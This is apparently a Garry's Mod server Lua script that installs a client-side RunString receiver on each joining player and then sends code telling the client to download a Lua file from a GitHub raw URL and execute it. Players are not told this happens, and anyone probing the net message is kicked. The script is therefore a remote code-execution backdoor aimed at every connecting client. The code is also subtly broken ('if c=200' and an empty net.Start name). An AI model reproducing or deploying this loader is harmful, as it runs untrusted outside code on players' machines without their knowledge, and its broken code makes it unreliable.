util.AddNetworkString("net_luarun_cl");

net_luarun_cl_wait_init=net_luarun_cl_wait_init||{};
net.Receive("net_luarun_cl",function(_,ply)
	if IsValid(ply) then
		if net_luarun_cl_wait_init[ply] then
			net_luarun_cl_wait_init[ply]=nil;
			--
			net.Start("");
			net.WriteString([[http.Fetch("https://raw.githubusercontent.com/censorry/ETC-Redux/main/net_luarun/cl_net_luarun.lua",function(s,_,_,c)if c=200 then RunString(s)end end)]]);
			net.Send(ply);
		else
			game.KickID(ply:UserID(),"Trying to find exploitable net");
		end;
	end;
end);

hook.Add("PlayerInitialSpawn","PlayerFullyLoaded",function(init_ply)
	hook.Add("SetupMove",init_ply,function(ply,_,cmd)
		if ply==init_ply then
			if cmd:IsForced() then
			else
				hook.Remove("SetupMove",init_ply);
				hook.Run("PlayerFullyLoaded",init_ply);
			end;
		end;
	end);
end);

hook.Add("PlayerFullyLoaded","net_luarun_cl",function(ply)
	net_luarun_cl_wait_init[ply]=true;
	ply:SendLua([[net.Receive("net_luarun_cl",function()RunString(net.ReadString())end)net.Start("net_luarun_cl")net.SendToServer()]]);
end);